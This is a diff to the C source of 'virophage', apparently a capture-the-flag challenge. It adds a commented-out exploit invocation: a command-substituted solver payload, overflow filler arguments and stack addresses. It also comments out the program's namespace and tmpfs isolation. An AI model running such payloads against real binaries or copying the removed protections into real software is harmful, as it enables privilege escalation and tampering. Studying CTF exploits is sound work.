@@ -2,7 +2,11 @@
 /*
  * Copyright 2023 Google LLC.
  */
-
+#if 0
+./virophage AA$(python ./sol.py) BBBBBBBB CCCCCCCC DDDDDDDD EEEEEEEE FFFFFFFF AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA ZZZZZZZZ
+ffffdd78
+ffffddc8
+#endif
 #define _GNU_SOURCE
 
 #include <elf.h>
@@ -262,14 +266,14 @@ static void virophage_write_virus(const char *path)
 
 static int virophage_main(int argc, char **argv, char **envp)
 {
-	/* Do stuff in a private tmpfs so there's no way for adversary to
-	   mess with the files we create */
-	if (_vp_sys_unshare(CLONE_NEWNS) < 0)
-		_vp_error(1, _vp_errno, "unshare(CLONE_NEWNS)");
-	if (_vp_sys_mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL) < 0)
-		_vp_error(1, _vp_errno, "mount(/, MS_REC | MS_PRIVATE)");
-	if (_vp_sys_mount("tmpfs", "/tmp", "tmpfs", MS_NOSUID | MS_NODEV, NULL))
-		_vp_error(1, _vp_errno, "mount(/tmp)");
+	// /* Do stuff in a private tmpfs so there's no way for adversary to
+	//    mess with the files we create */
+	// if (_vp_sys_unshare(CLONE_NEWNS) < 0)
+	// 	_vp_error(1, _vp_errno, "unshare(CLONE_NEWNS)");
+	// if (_vp_sys_mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL) < 0)
+	// 	_vp_error(1, _vp_errno, "mount(/, MS_REC | MS_PRIVATE)");
+	// if (_vp_sys_mount("tmpfs", "/tmp", "tmpfs", MS_NOSUID | MS_NODEV, NULL))
+	// 	_vp_error(1, _vp_errno, "mount(/tmp)");
 
 	virophage_write_virus("/tmp/virus");
 
